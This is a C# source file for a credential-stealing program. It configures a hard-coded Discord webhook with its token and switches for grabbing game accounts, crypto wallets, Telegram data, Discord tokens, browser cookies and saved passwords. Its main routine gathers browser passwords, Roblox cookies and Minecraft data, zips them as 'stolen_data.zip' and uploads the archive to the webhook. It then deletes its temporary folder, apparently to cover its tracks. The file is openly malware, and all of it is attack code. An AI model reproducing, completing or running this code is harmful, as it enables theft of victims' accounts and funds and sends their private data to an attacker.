using Plexity.SL;
using SL;
using SLler;
using System.IO.Compression;

public class Settings
{
    public static string WebhookUrl = "https://discord.com/api/webhooks/1404160691543343104/Jt103yBpRHwVYSwMOMepC2DnpsPfhk2QWdc22x7ykenCAj7xuR8Q4hMeuGkkIxd0mduM";
	public static string _tempDir = Path.Combine(Path.GetTempPath(), "SLerData");
	public static List<string> _cookies = new List<string>();
	public static int _passwordsCount = 0;
	public static int _robloxCookiesCount = -1;
	public static int _minecraftCount = -1;
	public static int _walletsCount = 0;

	public static bool CaptureGames = true;
    public static bool CaptureWallets = true;
    public static bool CaptureTelegram = true;
    public static bool CaptureDiscordTokens = true;
	public static bool CaptureCookies = true;
	public static bool CapturePasswords = true;

}

class SLer
{


	public void Run()
    {
		
		try
		{
			Directory.CreateDirectory(Settings._tempDir);

            Browser.SLPassword();
            Roblox.SLRobloxCookies();
            Minecraft.SLMinecraft();
			CreateArchive();
            SendToDiscord();
        }
        finally
        {
            Directory.Delete(Settings._tempDir, true);
        }
    }



 

    private void CreateArchive()
    {
        string zipPath = Path.Combine(Path.GetTempPath(), "stolen_data.zip");
        if (File.Exists(zipPath)) File.Delete(zipPath);
        
        ZipFile.CreateFromDirectory(Settings._tempDir, zipPath);
    }

    private void SendToDiscord()
    {
        string zipPath = Path.Combine(Path.GetTempPath(), "stolen_data.zip");
        if (!File.Exists(zipPath)) return;

        using (var http = new HttpClient())
        {
            var content = new MultipartFormDataContent();
            content.Add(new StringContent("Stolen Data"), "username");
            content.Add(new StringContent($"Browser Pass: {Settings._passwordsCount}\nRoblox: {Settings._robloxCookiesCount}\nMinecraft: {Settings._minecraftCount}"), "content");
            
            var fileContent = new ByteArrayContent(File.ReadAllBytes(zipPath));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
            content.Add(fileContent, "file", "stolen_data.zip");

            http.PostAsync(Settings.WebhookUrl, content).Wait();
        }
    }
}